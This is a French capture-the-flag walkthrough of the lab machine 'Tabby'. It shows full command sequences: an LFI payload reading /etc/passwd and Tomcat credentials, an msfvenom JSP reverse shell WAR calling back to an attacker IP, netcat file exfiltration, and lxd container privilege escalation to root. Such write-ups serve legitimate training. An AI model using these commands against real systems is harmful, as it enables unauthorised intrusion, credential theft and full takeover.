![Pic1](../img/tabby1.PNG?raw=true) </br>

# Introduction

Tabby est une machine linux dont l'adresse IP est 10.10.10.194.</br>
Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* Enumération des fichiers et dossiers d'un site web.
* LFI -> credential.
* Cracking zip password.
* Elevation via lxd.
</br>

# Enumération initiale
Nous commençons par l'énumération des services et ports de la box avec nmap :
```bash
$ nmap -T4 -A 10.10.10.194
```
![Pic2](../img/tabby2.PNG?raw=true) </br>
L'énumération de dossiers/fichiers sur les deux serveur web ne donnera rien.</br>
Un rapide tour sur les sites web nous permet de voir un service de "MEGA HOSTING" et un tomcat sur le port 8080.

# Obtenir un accès utilisateur
Sur le port 80, la page news contient l'url suivante : megahosting.htb/news.php?file=statement</br>
Une LFI est présente sur le site, nous tentons alors le payload : **../../../../../../etc/passwd** :</br>
![Pic3](../img/tabby3.PNG?raw=true) </br>
Du coté du port 80, rien d'autre à en tirer, la LFI va nous permettre de trouver les credentials de tomcat :
```bash
$ curl http://megahosting.htb/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
```
![Pic4](../img/tabby4.PNG?raw=true) </br>
Nous pouvons alors nous connecter en tant que tomcat sur le port 8080.</br>
En regardant la documentation, on voit que l'on peut déployer des fichiers WAR à distance sur le site :</br>
![Pic5](../img/tabby5.PNG?raw=true) </br>
Nous allons faire un reverse shell en WAR et l'upload avec curl :
```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.34 LPORT=4567 -f war > rev.war
$ curl -X PUT rev.war http://'tomcat:$3cureP4s5w0rd123!'@megahosting.htb:8080/manager/text/deploy?path=/myfoo3
```
Le serveur n'executant que du jsp, il nous faut trouver le jsp et l'exécuter :
```bash
$ unzip rev.war
$ curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/myfoo3
```
![Pic6](../img/tabby6.PNG?raw=true) </br>
Un fichier zip est à l'emplacement /var/www/html/files/, mais requiert un mot de passe pour être extrait, on le récupère avec netcat :
```bash
$ nc -l -p 1234 >16162020_backup.zip # sur kali
$ nc -w 3 10.10.14.34 1234 < 16162020_backup.zip # sur la box
```
Et nous le crackons avec john :
```bash
$ zip2john 16162020_backup.zip > zip.hash
$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
![Pic7](../img/tabby7.PNG?raw=true) </br>
SSH ne répondant pas, on retourne sur le reverse shell pour switch de user et récupérer le user.txt :
```bash
$ su ash
$ cat /home/ash/user.txt
```
![Pic8](../img/tabby8.PNG?raw=true) </br>

# Obtenir un accès administrateur
Nous pouvons voir avec la commande id que nous sommes dans le groupe lxd :
```bash
$ id
```
![Pic9](../img/tabby9.PNG?raw=true) </br>
Un rapide tour sur l'internet nous permet de voir un article permettant une élèvation de privilège bien guidée :</br>
https://www.hackingarticles.in/lxd-privilege-escalation/</br>
Nous avons juste à la suivre et à lire le flag dans root.txt :
```bash
####### Sur notre machine, on créer une vm et on partage le tar.gz
$ git clone https://github.com/saghul/lxd-alpine-builder.git
$ cd lxd-alpine-builder
$ sudo bash build-alpine
$ python3 -m http.server

####### Sur la box, sur le home de ash, on récupère le tar.gz pour l'importer et monter le /root dedans.
$ wget 10.10.14.34:8000/alpine-v3.12-x86_64-XXXXXXXXX.tar.gz
$ lxc image import ./alpine-v3.12-x86_64-XXXXXXXXX.tar.gz --alias myimage
$ lxc image list
$ lxc init myimage hello -c security.privileged=true
$ lxc config device add hello mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start hello
$ lxc exec hello /bin/sh
$ cd /mnt/root/root
$ cat root.txt
```
![Pic10](../img/tabby10.PNG?raw=true) </br>